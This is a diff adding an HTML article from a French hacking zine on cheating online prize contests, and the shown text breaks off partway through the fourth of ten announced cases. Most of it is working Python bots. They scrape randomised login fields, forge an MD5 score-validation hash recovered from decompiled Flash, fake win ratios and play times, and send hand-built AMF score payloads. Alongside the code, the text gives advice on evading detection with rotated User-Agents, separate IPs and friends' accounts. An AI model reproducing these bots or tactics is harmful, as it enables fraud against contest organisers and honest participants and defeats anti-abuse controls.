@@ -1,0 +1,1314 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+  </head>
+
+  <body>
+    <h1>Tricher aux jeux concours : 10 exemples dont 1 essai de hack</h1>
+
+    <p>Tricher aux jeux concours, certains diront que c'est déguelasse, que ce n'est pas du jeu etc. Pour ceux qui ont passé des dizaines d'heures sur un jeu pour obtenir un bon score alors qu'il nous a fallu 5 minutes pour les dépasser, je dis ceçi : un jeu ne devrait t-il pas récompenser l'intelligence plutôt que l'acharnement ? Quel intérêt il y a t-il à cliquer comme un bourrin sur sa souris à s'en casser l'index ? Alors qu'analyser un algorithme, casser des protections, coder un bot, ça c'est intéressant :)</p>
+
+    <p>Dans cet article on va étudier 10 cas de triche sur des jeu-concours différents. Toutes les entitées, entreprises, sites Internet décrites dans l'article sont fictives. Toute ressemblance serait fortuite. La tentative de hack est bien sûr fictive, totalement imaginaire et romancée. Bien loin de nous, simples anonymes que nous sommes, l'idée de ne pas respecter la loi ou d'inciter à quelques crimes que ce soit car nul n'est censé ignorer la loi. Suivons scrupuleusement l'exemple de nos politiques en matière d'intégrité et d'honnêteté, eux qui nous montrent tellement bien comment se comporter en société.</p>
+
+    <p>Outils à utiliser pour ce type d'analyse :<br />
+    Un proxy web applicatif comme <em>Burp Suite</em>, <em>Paros</em> ou un plugin navigateur permettant d'intercepter et modifier les requêtes HTTP. J'ai une préférence pour <em>Charles Proxy</em> car il gère des formats d'encodage comme XMl, JSON et AMF. A défaut, un analyser de trames (Wireshark) fera l'affaire.<br />
+    Un décompilateur de fichiers SWF. Notre préférence va à <em>Sothink SWF Decompiler</em><br />
+    De quoi coder des programmes qui enverront des requêtes HTTP. Langage de programmation votre choix.</p>
+
+    <p>Quelques conseils :</p>
+    <ul>
+      <li>Lire le réglement du jeu avant de participer. Il contient généralement des détails intéressants sur le fonctionnement du jeu et la désignation des gagnants ;-)</li>
+      <li>Utiliser plusieurs comptes, notamment un pour faire des tests. Attention car plusieurs scores pour une même adresse IP est souvent interdit.</li>
+      <li>Etre prudent, ne pas soumettre de score au pif. Reportez vous au classement si il existe et essayez de démasquer les autres tricheurs.</li>
+      <li>N'hésitez pas à inscrire vos amis pour augmenter vos chances de remporter le lot.</li>
+      <li>Rester autant que possible dans la perspective du jeu, n'employer des moyens détournés que si vous ne pouvez pas faire autrement.</li>
+      <li>Pas de prise de risque pour un foutu jeu.</li>
+    </ul>
+
+    <p>Après ça, on peut s'y mettre. Retrouvez certains des codes dans <a href="../data/concours">data/concours</a>. Bonne lecture.</p>
+
+<h2>Jeu numéro 1</h2>
+<p><u>Présentation</u></p>
+<p>La société <em>Bricabrac</em> organise un concours qui permettra aux gagnants de remporter divers lots hight-tech.<br />
+Elle a fait appel à la société <em>Concours-Flash</em> qui a créé un jeu flash pour l'occasion qu'elle héberge sur ses serveurs.<br />
+Le jeu est un classique du type pierre/feuille/ciseaux joué contre l'ordinateur. Une partie se fait en 3 coups. Pour chaque coup on peut donc être gagnant, perdant ou ex-aequo.<br />
+Le jeu se déroule sur une période de temps prédéfini. Les gagnants seront donc ceux qui auront le plus de points à l'issu du jeu concours.</p>
+
+<p><u>Pwnage</u></p>
+<p>Une analyse des pages web et des communications lors d'une partie de test nous donne les infos suivantes :<br />
+Un cookie est créé lors de la première connexion à la page du jeu. Il faut ensuite s'identifier (inscription préalable) via un formulaire dont les noms des champs de login et de mot de passe sont de toute évidence générés aléatoirement pour bloquer des attaques par rejeu. Bien sûr ça ne bloquera pas un programmeur ;-)<br />
+On tombe ensuite sur une page de transition avec un formulaire et un champ caché correspondant encore une fois à une clé générée aléatoirement.<br />
+Passé cette page, c'est l'animation Flash qui prend le relais. Pour chaque coup, une première requête est envoyée indiquant au serveur que le menu de sélection du coup est chargé.<br />
+Une seconde requête est envoyée lorsque le joueur a sélectionné son coup (pierre, feuille ou ciseaux) et que le résultat a été affiché. Cette seconde requête est envoyée avec un timestamp (date UNIX en secondes) qui correspond au début de la partie.<br />
+Ca permet au serveur de calculer la durée de la partie (temps entre ce timestamp et la requête de fin de la partie). Si le temps est trop court, c'est que l'utilisateur a triché.</p>
+
+<p>Comme le gagnant est celui qui aura fait le plus de parties gagnantes, on peu tricher sur la proportion de victoires par rapport aux défaites et optimiser le temps de nos parties par des essais : si notre score n'est pas pris en compte, cela signifie qu'on est allé trop vite. On augmente ce temps jusqu'à obtenir le temps minimum où le score est pris en compte.</p>
+
+<p>Notre bot dans sa version finale (après moult essais) était le suivant :</p>
+
+<pre>import httplib
+import time
+import re
+import urllib
+import sys
+import random
+
+navigateurs = ['Opera/9.80 (Windows NT 5.1; U; fr) Presto/2.6.30 Version/10.63',
+                'Mozilla/5.0 (X11; U; Linux x86_64; en-US) AppleWebKit/534.7 (KHTML, like Gecko) Chrome/7.0.517.44 Safari/534.7',
+                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; Trident/4.0; GTB6.6; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0;',
+                'Mozilla/5.0 (Linux; U; Android 2.2; en-gb; Nexus One Build/FRF50)',
+                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; MyIE2; InfoPath.2)',
+                'Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US)',
+                'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; .NET CLR 2.0.50727; MAXTHON 2.0)',
+                'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8']
+
+base_headers = {}
+base_headers[&quot;Accept&quot;] = &quot;application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&quot;
+base_headers[&quot;User-Agent&quot;] = random.choice(navigateurs)
+base_headers[&quot;Accept-Language&quot;] = &quot;fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4&quot;
+base_headers[&quot;Accept-Charset&quot;] = &quot;ISO-8859-1,utf-8;q=0.7,*;q=0.3&quot;
+
+msg = {'G':'Gagne', 'P':'Perdu', 'N':'Nul'}
+
+while True:
+    # Selection d'un des perso propose au hazard
+    personnage = random.choice(['nounours', 'magicien', 'rambo', 'oussama', 'bernadette'])
+    cnx = httplib.HTTPConnection(&quot;www.concours-flash.fr&quot;)
+    h = base_headers.copy()
+    # Premiere connexion au site pour obtenir un cookie
+    h[&quot;Referer&quot;] = &quot;http://www.bricabrac.com/concours/go.html&quot;
+    cnx.request(&quot;GET&quot;, &quot;/bricabrac/index.php&quot;, headers = h)
+    resp = cnx.getresponse()
+    data = resp.read()
+    cookie = resp.getheader(&quot;Set-Cookie&quot;, &quot;&quot;).split(';')[0].strip()
+    h[&quot;Cookie&quot;] = cookie
+
+    # On reduit le contenu de la page au formulaire
+    start = data.find('id=&quot;formulaire&quot;')
+    end = data.find('&lt;/form&gt;', start)
+    form = data[start+1:end]
+
+    start = form.find('name=&quot;key&quot;')
+    end = form.find(&quot; /&gt;&quot;, start)
+    # Les noms des champs etant generes aleatoirement on doit les recuperer
+    # Heureusement la presence du type des champs (text et password) nous aide
+    # et puis ils ressemblent a des hashs... donc un ptit coup de regex et c ok
+    try:
+      key = re.findall(r&quot;([a-f\d]{32})&quot;, form[start:end])[0]
+    except IndexError:
+      continue
+
+    start = form.find('type=&quot;text&quot;', end)
+    end = form.find(&quot; /&gt;&quot;, start)
+    try:
+      email = re.findall(r&quot;([a-f\d]{32})&quot;, form[start:end])[0]
+    except IndexError:
+      continue
+
+    start = form.find('type=&quot;password&quot;', end)
+    end = form.find(&quot; /&gt;&quot;, start)
+    try:
+      password = re.findall(r&quot;([a-f\d]{32})&quot;, form[start:end])[0]
+    except IndexError:
+        continue
+
+    # Maintenant qu'on a les champs, on envoi le formulaire
+    d = {'key': key, 'action' : 'login', 'formulaire' : '2', email : 'hacker@plop.com', password : 'h4ck3r'}
+
+    h[&quot;Referer&quot;] = &quot;http://www.concours-flash.fr/bricabrac/index.php&quot;
+    h[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+    cnx.request(&quot;POST&quot;, &quot;/bricabrac/index.php&quot;, urllib.urlencode(d), headers = h)
+    resp = cnx.getresponse()
+    data = resp.read()
+
+    # Page de transition
+    h.pop(&quot;Content-Type&quot;)
+    cnx.request(&quot;GET&quot;, &quot;/bricabrac/index.php&quot;, headers = h)
+    resp = cnx.getresponse()
+    data = resp.read()
+
+    # La encore cle aleatoire a extraire
+    end = data.find('&lt;/form&gt;&quot;')
+    start = data.rfind('name=&quot;key', 0, end)
+    try:
+      key = re.findall(r&quot;([a-f\d]{32})&quot;, data[start:end])[0]
+    except IndexError:
+      continue
+    d = { 'key' : key}
+
+    h[&quot;Content-Type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+    cnx.request(&quot;POST&quot;, &quot;/bricabrac/index.php&quot;, urllib.urlencode(d), headers = h)
+    resp = cnx.getresponse()
+    data = resp.read()
+
+    # Page de chargement du jeu Flash avec param timestamp
+    h.pop(&quot;Content-Type&quot;)
+    cnx.request(&quot;GET&quot;, &quot;/bricabrac/index.php&quot;, headers = h)
+    resp = cnx.getresponse()
+    data = resp.read()
+
+    start = data.find('value=&quot;timestamp=', end)
+    end = data.find('&amp;', start)
+    timestamp = re.findall(r&quot;([\d]{10})&quot;, data[start:end])[0]
+    print &quot;Timestamp:&quot;,timestamp
+
+
+    cnx2 = httplib.HTTPConnection(&quot;www.concours-flash.fr&quot;)
+    cnx2.request(&quot;GET&quot;, &quot;/bricabrac/flash/jeu.swf&quot;, headers = h)
+    resp = cnx2.getresponse()
+    resp.read(50)
+    cnx2.close()
+    time.sleep(1)
+
+    for x in range(0,15):
+      for coup in range(1, 4):
+
+        req = &quot;perso=%s&amp;var%%5Fcoup=%s&amp;action=insert&quot; % (personnage, coup)
+        cnx.request(&quot;POST&quot;, &quot;/bricabrac/coup.php&quot;, req, headers = h)
+        resp = cnx.getresponse()
+        data = resp.read()
+        print &quot;Round&quot;, coup, &quot;:&quot;, data.split(&quot;=&quot;)[1]
+        cnx.close()
+
+        time.sleep(5.5)
+
+        # Gagnant, perdant ou nul ?
+        r = random.choice(&quot;GGGNNP&quot;)
+        print msg[r]
+        d = {'timestamp' : timestamp, 'perso' : personnage, 'resultat' : r, 'action' : 'update'}
+        cnx = httplib.HTTPConnection(&quot;www.concours-flash.fr&quot;)
+        cnx.request(&quot;POST&quot;, &quot;/bricabrac/coup.php&quot;, urllib.urlencode(d), headers = h)
+        try:
+          resp = cnx.getresponse()
+          data = resp.read()
+        except httplib.BadStatusLine:
+          print(&quot;:(&quot;)
+          pass
+
+
+      cnx.request(&quot;POST&quot;, &quot;/bricabrac/victoire.php&quot;, &quot;action=nombre%5Fvictoire&quot;, headers = h)
+      resp = cnx.getresponse()
+      data = resp.read()
+      print &quot;Nombre de victoires:&quot;, data.split(&quot;=&quot;)[1]
+
+      cnx.request(&quot;POST&quot;, &quot;/bricabrac/flashvars.php&quot;, &quot;action=reload&quot;, headers = h)
+      resp = cnx.getresponse()
+      data = resp.read()
+      if random.choice(&quot;GGGNNP&quot;) == &quot;G&quot;:
+        start = data.find(&quot;{&quot;) + 1
+        end = data.rfind(&quot;}&quot;) - 1
+        print &quot;\n&quot;.join(data[start:end].split(&quot;}&quot;))
+      print
+    cnx.close()</pre>
+
+
+<p><u>Résultat</u></p>
+<p>Malgré qu'à la clôture du jeu le bot soit placé parmis les gagnants, lors de la désignation des gagnants il n'y apparaissait plus.<br />
+On a joué plus discret que certains tricheurs qui se sont placés en top list en quelques minutes seulement (et leur compte directement supprimé ensuite) mais pas assez fin : vers la fin du jeu la bataille faisait rage avec d'autres joueurs qui devaient avoir aussi leur propre bot. Pour devoir l'emporter on a du abuser sur les proportions de parties gagnantes, ce qui était forcément visible lors de la récolte des scores...<br />
+On a donc pas obtenu le moindre lot... Le bot était assez discret mais on a agit par excès de confiance. A noter que le réglement interdisait les bots et que les organisateurs se réservaient aussi le droit d'annuler le jeu.<br />
+Vu le nombre de tricheurs que l'on a croisé, il n'est pas certain que les gagnants listés des mois après la cloture du jeu aient effectivement touché leurs lots.</p>
+
+<h2>Jeu numéro 2</h2>
+<p><u>Présentation</u></p>
+<p>La chaine de restaurants <em>Cornedbeef</em> organise un jeu dont le gain est un voyage par avion pour une très grande ville US.<br />
+Le jeu est un autre classique des concours flash : des objets tombent et il faut les ramasser ou les aiguiller au bon endroit.<br />
+Parmis ceux qui auront les meilleurs scores, un tirage au sort aura lieu pour désigner le gagnant.</p>
+
+<p><u>Pwnage</u></p>
+<p>Ici peu de requêtes ont lieu lors d'une partie. On croise d'abord un formulaire avec là encore un champ aléatoire (cette fois sa valeur).<br />
+Une fois passé le login, le jeu se charge. A la fin du jeu les scores sont envoyés vers le serveur.<br />
+On remarque une variable particulière qui ressemble à un hash md5.<br />
+On récupère le swf du jeu, on le passe à la moulinette avec <em>Sothink SWF Decompiler</em> et on trouve la fonction suivante :</p>
+
+<pre>public function envoiScore()
+{
+    var _loc_1:* = new URLVariables();
+    _loc_1.score = Jeu.lastScore;
+    _loc_1.firstname = Jeu.firstname;
+    _loc_1.lastname = Jeu.lastname;
+    _loc_1.buffalo = Jeu.id;
+    _loc_1.id = MD5.hash(Jeu.lastScore + &quot;:&quot; + Jeu.firstname + &quot;:&quot; + Jeu.id);
+    var _loc_2:* = new URLRequest(&quot;php/envoiscore.php&quot;);
+    _loc_2.data = _loc_1;
+    _loc_2.method = URLRequestMethod.POST;
+    var _loc_3:* = new URLLoader();
+}</pre>
+
+<p>La clé est bien un hash MD5 correspondant au score, le pseudo du joueur et son id sur le jeu le tout séparé par le caractère ':'.</br>
+A partir de là ce n'est pas compliqué d'envoyer le score que l'on souhaite au serveur.<br />
+<br />
+Le code final est le suivant :</p>
+
+<pre>import hashlib
+import httplib2
+import sys
+import re
+import urllib
+
+# On demande les infos a envoyer sur la console
+email = raw_input(&quot;Email: &quot;)
+passwd = raw_input(&quot;Password: &quot;)
+score = raw_input(&quot;Score: &quot;)
+
+if not score.isdigit():
+    print &quot;Le score doit etre un chiffre!!!&quot;
+    sys.exit()
+
+if int(score) &gt; 8000:
+    print &quot;score trop grand!&quot;
+    sys.exit()
+
+navigateur = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) Chrome/7.0.517.44 Safari/534.7'
+h = {}
+h[&quot;Accept&quot;] = &quot;application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&quot;
+h[&quot;User-Agent&quot;] = navigateur
+h[&quot;Accept-Language&quot;] = &quot;fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4&quot;
+h[&quot;Accept-Charset&quot;] = &quot;ISO-8859-1,utf-8;q=0.7,*;q=0.3&quot;
+h[&quot;Referer&quot;] = &quot;http://www.cornedbeef.fr/jeu/&quot;
+
+# Obtenir le formulaire de login + cookie
+cnx = httplib2.Http()
+resp, data = cnx.request(&quot;http://www.cornedbeef.fr/beef/login&quot;, headers=h)
+
+cookie_name = resp[&quot;set-cookie&quot;].split(&quot;=&quot;)[0]
+cookie = resp[&quot;set-cookie&quot;].split(&quot;;&quot;)[0] + &quot;; mt_redirect=true&quot;
+h[&quot;Cookie&quot;] = cookie
+print
+print &quot;Connecting...&quot;
+print &quot;Cookie:&quot;, h[&quot;Cookie&quot;]
+print
+
+start = data.find('form_build_id&quot; id=&quot;') + 19
+end = data.find('&quot;', start)
+form_id = data[start:end]
+print &quot;Found form_id&quot;, form_id
+
+# Identification
+h[&quot;Content-type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+h[&quot;Referer&quot;] = &quot;http://www.cornedbeef.fr/beef/login&quot;
+req =  &quot;name=&quot; + urllib.quote_plus(email)
+req += &quot;&amp;pass=&quot; + urllib.quote_plus(passwd)
+req += &quot;&amp;remember_me=1&amp;form_build_id=&quot; + form_id + &quot;&amp;form_id=user_login&amp;op=connecter&quot;
+resp, data = cnx.request(&quot;http://www.cornedbeef.fr/beef/login&quot;, &quot;POST&quot;, body = req, headers = h)
+new_val = re.findall(r&quot;=([a-f\d]{32});&quot;, resp[&quot;set-cookie&quot;])[0]
+
+cookie = cookie_name + &quot;=&quot; + new_val + &quot;; mt_redirect=true&quot;
+print &quot;Login in...&quot;
+print &quot;New cookie:&quot;, cookie
+
+h[&quot;Cookie&quot;] = cookie
+
+start = data.find(&quot;&lt;status&gt;&quot;) + 8
+end = data.find(&quot;&lt;/status&gt;&quot;, start)
+if data[start:end] == &quot;0&quot;:
+    print &quot;Erreur de login!&quot;
+
+start = data.find(&quot;&lt;id&gt;&quot;) + 4
+end = data.find(&quot;&lt;/id&gt;&quot;, start)
+id = data[start:end]
+
+start = data.find(&quot;&lt;prenom&gt;&quot;) + 8
+end = data.find(&quot;&lt;/prenom&gt;&quot;, start)
+firstname = data[start:end]
+
+start = data.find(&quot;&lt;nom&gt;&quot;) + 5
+end = data.find(&quot;&lt;/nom&gt;&quot;, start)
+lastname = data[start:end]
+
+print &quot;Logged in with userid %s (%s %s)&quot; % (id, firstname, lastname)
+
+
+text = score + &quot;:&quot; + firstname + &quot;:&quot; + id
+h.pop(&quot;Referer&quot;)
+hacked_id = hashlib.md5(text).hexdigest()
+req = &quot;score=%s&amp;lastname=%s&amp;steak=%s&amp;id=%s&amp;firstname=%s&quot; % \
+        (score, lastname, id, hacked_id, firstname)
+print &quot;Generating score ID&quot;, hacked_id
+
+print &quot;Resultats:&quot;
+h[&quot;Content-type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+resp, data = cnx.request(&quot;http://www.cornedbeef.fr/jeu/php/envoiscore.php&quot;, &quot;POST&quot;, req, headers = h)
+print data
+h.pop(&quot;Content-type&quot;)
+
+# Affichage resultat
+resp, data = cnx.request(&quot;http://www.cornedbeef.fr/jeu/php/userinfo.php?steak=&quot; + id, headers = h)
+print data
+
+resp, data = cnx.request(&quot;http://www.cornedbeef.fr/jeu/php/top5.php&quot;, headers = h)
+print data</pre>
+
+<p><u>Résultat</u></p>
+<p>Sachant qu'un tirage au sort final aura lieu, on s'est dit autant augmenter nos chances sur le tirage aussi. On a donc demandé à des potes de s'enregistrer sur le jeu chacun avec une IP différente et de nous communiquer leurs identifiants. On a alors envoyé des scores gagnant pour ces comptes, toujours avec des IPs séparées...<br />
+Mais on est toujours sans nouvelles de l'organisateur qui indique depuis plus d'un an sur son site que le gagnant sera bientôt contacté.<br />
+Conclusion, là encore le tricheur n'est pas celui que l'on croit... L'organisateur a récolté plein d'adresses mails avec son concours et le lot n'a jamais été donné.</p>
+
+<h2>Jeu numéro 3</h2>
+<p><u>Présentation</u></p>
+<p>Les magasins <em>HyperSuper</em> ont sur leur site une section avec différents jeux qui permettent de gagner des réductions ou des lots de temps en temps.<br />
+Avec un bon score aux jeux on augmente nos chances d'obtenir un cadeau. On a opté pour le jeu de Mahjong qui est plutôt sympa.</p>
+
+<p><u>Pwnage</u></p>
+<p>Après analyse des communications lors d'une partie ça semble assez simple. La seule difficultée est l'envoi par le jeu flash d'une variable de timestamp à intervale régulier (sur une url de ping) ainsi que une variable d'aléa sur une page appellée dispatch.<br />
+Il a d'abord fallu analyser le flash pour confirmer que la variable était vraiment aléatoire. L'objectif du ping est de maintenir la session de l'utilisateur ouverte pendant qu'il joue (certains jeux peuvent durer longtemps).</p>
+
+<p>On a mis ça en place de la façon suivante :</p>
+
+<pre>import httplib2
+import sys
+import re
+import urllib
+import random
+from threading import Thread
+import time
+import BeautifulSoup
+import socks
+
+PHPSESSID = &quot;&quot;
+ok = 1
+
+navigateur = 'Mozilla/5.0 (X11; U; Linux x86_64; en-US) Chrome/7.0.517.44 Safari/534.7'
+h = {}
+h[&quot;Accept&quot;] = &quot;application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5&quot;
+h[&quot;User-Agent&quot;] = navigateur
+h[&quot;Accept-Language&quot;] = &quot;fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4&quot;
+h[&quot;Accept-Charset&quot;] = &quot;ISO-8859-1,utf-8;q=0.7,*;q=0.3&quot;
+h[&quot;Accept-Encoding&quot;] = &quot;identity&quot;
+
+cnx = httplib2.Http()
+
+# Un thread qui gere la page de ping
+class Ping(Thread):
+    def __init__(self):
+        Thread.__init__(self)
+
+    def run(self):
+        head = h.copy()
+        while True:
+            t = str(int(time.time() * 1000))
+            ping_url = &quot;http://www.super.com/php/ping.php?PHPSESSID=&quot; + PHPSESSID
+            ping_url += &quot;&amp;t=&quot; + t
+            head[&quot;Cookie&quot;] = &quot;PHPSESSID=&quot; + PHPSESSID
+            resp, data = cnx.request(ping_url, headers=head)
+            print ping_url
+            if data.strip() != &quot;&quot;:
+                print &quot;ping response:&quot;, data.strip()
+            time.sleep(30)
+            if ok == 0:
+                break
+
+
+# Page des jeux qui nous renvoie un cookie + formulaire login
+resp, data = cnx.request(&quot;http://www.hyper.com/portail/accueil_jeux&quot;, headers=h)
+
+JSESSIONID = resp[&quot;set-cookie&quot;].split(&quot;=&quot;)[1].split(';')[0]
+h[&quot;Cookie&quot;] = &quot;JSESSIONID=&quot; + JSESSIONID
+
+
+d = {}
+soup = BeautifulSoup.BeautifulSoup(data)
+form_url = soup.form[&quot;action&quot;]
+for input in soup.form.findAll(&quot;input&quot;):
+    if input[&quot;type&quot;] == &quot;image&quot;:
+        continue
+    if input[&quot;name&quot;].endswith(&quot;login}&quot;):
+        d[input[&quot;name&quot;]] = &quot;hacker&quot;
+    elif input[&quot;name&quot;].endswith(&quot;password}&quot;):
+        d[input[&quot;name&quot;]] = &quot;c0ncours&quot;
+
+# Envoi des identifiants
+h[&quot;Content-type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+h[&quot;Referer&quot;] = &quot;http://www.hyper.com/portail/accueil_jeux&quot;
+resp, data = cnx.request(form_url, &quot;POST&quot;, body = urllib.urlencode(d), headers = h)
+soup = BeautifulSoup.BeautifulSoup(data)
+
+h.pop(&quot;Content-type&quot;)
+h.pop(&quot;Cookie&quot;)
+
+# Le jeu en lui meme est joue dans une iframe
+resp, data = cnx.request(soup.iframe[&quot;src&quot;], headers = h)
+PHPSESSID = resp[&quot;content-location&quot;].split(&quot;=&quot;)[1]
+h[&quot;Cookie&quot;] = &quot;PHPSESSID=&quot; + PHPSESSID
+
+resp, data = cnx.request(&quot;http://www.super.com/?PHPSESSID=&quot; + PHPSESSID, headers = h)
+
+# On declare un debut de partie
+h.pop(&quot;Referer&quot;)
+url = &quot;http://www.super.com/php/dispatch.php?PHPSESSID=&quot; + PHPSESSID
+url += &quot;&amp;service=init&amp;alea=&quot; + str(random.randint(1000,11000))
+resp, data = cnx.request(url, headers = h)
+
+# Si notre login est dans la page, la cnx a fonctionne
+if data.find(&quot;HACKER&quot;) &gt; 1:
+    print &quot;Logged in :)&quot;
+else:
+    print &quot;Login error&quot;
+    sys.exit()
+
+
+form_url = &quot;http://www.super.com/php/dispatch.php?PHPSESSID=&quot; + PHPSESSID
+form_url += &quot;&amp;service=jeu&amp;alea=&quot; + str(random.randint(1000,11000))
+h[&quot;Content-type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+resp, data = cnx.request(form_url, &quot;POST&quot;, body = &quot;id%5Fjeu=13&quot;, headers = h)
+
+soup = BeautifulSoup.BeautifulSoup(data)
+id_partie = soup.infos.id_partie.next
+print &quot;id partie:&quot;, id_partie
+mess_err = soup.infos.mess_err.next.strip()
+if mess_err != &quot;&quot;:
+    print &quot;!&quot;,mess_err,&quot;!&quot;
+    sys.exit()
+
+# On lance notre thread de ping
+ping = Ping()
+ping.start()
+
+# On attend pour similer une partie en cours. Pendant ce temps ca ping.
+time.sleep(160)
+
+# On declare la fin de partie avec notre score
+form_url = &quot;http://www.super.com/php/dispatch.php?PHPSESSID=&quot; + PHPSESSID
+form_url += &quot;&amp;service=finjeu&amp;alea=&quot; + str(random.randint(1000,11000))
+req = &quot;data=0&amp;id%5Fpartie=&quot; + id_partie + &quot;&amp;score=5000&quot;
+resp, data = cnx.request(form_url, &quot;POST&quot;, body = req, headers = h)
+print data
+
+ok = 0</pre>
+
+<p><u>Résultat</u></p>
+<p>Abandonné... Certes on peu obtenir de bons scores mais les probabilités de gagner un lot important sont beaucoup trop faibles.</p>
+
+<h2>Jeu numéro 4</h2>
+<p><u>Présentation</u></p>
+<p>La société de sportswear <em>Trocool</em> organise le concours <em>Wesh Game</em>. Le jeu est un classique très proche du précédent sauf qu'il faut éviter les objets et tenir le plus longtemps possible.<br />
+Le score final est en fait la durée que l'on a tenu avant le game over.</p>
+
+<p><u>Pwnage</u></p>
+<p>Une analyse des communications montre que les données sont envoyées et reçues au format AMF via une install du framework AMF-PHP.<br />
+Ce format peut être très chiant quand il envoie des entiers ou qu'il faut gérer des chaines de taille variable... Or ici ce n'est pas le cas. Il faut juste faire attention au fait que le temps qui défile dans le jeu ne correspond pas au temps de jeu dans la vrai vie. Pour obtenir un bon score valide on va donc relever les meilleurs scores sur le top 10.<br />
+En dehors de ça, pas de difficultées particulières.</p>
+
+<pre>import httplib2
+import sys
+import re
+import urllib
+import random
+from threading import Thread
+import time
+import BeautifulSoup
+import socks
+import string
+
+PHPSESSID = &quot;&quot;
+ok = 1
+
+navigateur = 'Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.9.1.8) Gecko/20100202 Firefox/3.5.8'
+h = {}
+h[&quot;Accept&quot;] = &quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;
+h[&quot;User-Agent&quot;] = navigateur
+h[&quot;Accept-Language&quot;] = &quot;fr-FR,fr;q=0.8,en-US;q=0.6,en;q=0.4&quot;
+h[&quot;Accept-Charset&quot;] = &quot;ISO-8859-1,utf-8;q=0.7,*;q=0.3&quot;
+h[&quot;Accept-Encoding&quot;] = &quot;identity&quot;
+
+cnx = httplib2.Http()
+
+# Connexion premiere page pour avoir un cookie
+resp, data = cnx.request(&quot;http://www.trocool.fr/wesh-game&quot;, headers=h)
+
+PHPSESSID = resp[&quot;set-cookie&quot;].split(&quot;=&quot;)[1].split(&quot;;&quot;)[0]
+h[&quot;Cookie&quot;] = &quot;PHPSESSID=&quot; + PHPSESSID + &quot;;&quot;
+print h[&quot;Cookie&quot;]
+
+# Recuperation du &quot;captcha&quot;
+soup = BeautifulSoup.BeautifulSoup(data)
+captcha = soup.find('input', id=&quot;captcha&quot;)[&quot;value&quot;]
+print &quot;Captcha:&quot;, captcha
+
+# Envoi des indentifiants + captcha
+req  = &quot;login=hacker%40plop.com&amp;password=31337&amp;submit=ok&quot;
+req += &quot;captcha=&quot; + captcha
+
+h[&quot;Content-type&quot;] = &quot;application/x-www-form-urlencoded&quot;
+h[&quot;Referer&quot;] = &quot;http://www.trocool.fr/wesh-game&quot;
+resp, data = cnx.request(&quot;http://www.trocool.fr/wesh-game&quot;, &quot;POST&quot;, body = req, headers = h)
+
+# La page doit etre rechargee
+h.pop(&quot;Content-type&quot;)
+resp, data = cnx.request(&quot;http://www.trocool.fr/wesh-game&quot;, headers=h)
+
+# Si notre login est dans la page alors on est connecte
+if data.find(&quot;hacker&quot;) == -1:
+    print &quot;Echec :(&quot;
+    sys.exit()
+soup = BeautifulSoup.BeautifulSoup(data)
+
+# Encore une iframe a charge
+resp, data = cnx.request(soup.iframe[&quot;src&quot;], headers = h)
+soup = BeautifulSoup.BeautifulSoup(data)
+print &quot;Logged in :)&quot;
+
+# On fait des requetes pour demander les swf... meme si on s'en fout
+# c juste pour etre + discret
+resp, data = cnx.request(soup.embed[&quot;src&quot;], headers = h)
+
+h.pop(&quot;Referer&quot;)
+# idem
+resp, data = cnx.request(&quot;http://www.trocool.fr/wesh/swf/jeu.swf&quot;, headers = h)
+
+# On attend pour faire croire que l'on joue
+time.sleep(160)
+
+# Donnees AMF
+s  = &quot;\x00\x00\x00\x01\x00\x10&quot;
+s += &quot;amf_server_debug&quot;
+s += &quot;\x01\x00\x00\x00\x60\x03\x00\x0a&quot;
+s += &quot;coldfusion&quot;
+s += &quot;\x01\x01\x00\x0a&quot;
+s += &quot;amfheaders&quot;
+s += &quot;\x01\x00\x00\x03&quot;
+s += &quot;amf&quot;
+s += &quot;\x01\x00\x00\x0b&quot;
+s += &quot;httpheaders&quot;
+s += &quot;\x01\x00\x00\x09&quot;
+s += &quot;recordset&quot;
+s += &quot;\x01\x01\x00\x05&quot;
+s += &quot;error&quot;
+s += &quot;\x01\x01\x00\x05&quot;
+s += &quot;trace&quot;
+s += &quot;\x01\x01\x00\x07&quot;
+s += &quot;m_debug&quot;
+s += &quot;\x01\x01\x00\x00\x09\x00\x02\x00\x12&quot;
+s += &quot;services.getScores&quot;
+s += &quot;\x00\x02&quot;
+s += &quot;/1&quot;
+s += &quot;\x00\x00\x00\x05\x0a\x00\x00\x00\x00\x00\x11&quot;
+s += &quot;services.setScore&quot;
+s += &quot;\x00\x02&quot;
+s += &quot;/2&quot;
+s += &quot;\x00\x00\x00&quot;
+s += &quot;+&quot;
+s += &quot;\x0a\x00\x00\x00\x01\x0a\x00\x00\x00\x03\x02\x00\x04&quot;
+s += &quot;2634&quot;
+s += &quot;\x02\x00\x08&quot;
+
+# Le score... dans le temps du jeu video
+s += &quot;08:01:37&quot;
+
+s += &quot;\x02\x00\x0c&quot;
+s += &quot;hacker_31337&quot;
+
+print &quot;Pwning...&quot;
+h[&quot;Content-type&quot;] = &quot;application/x-amf&quot;
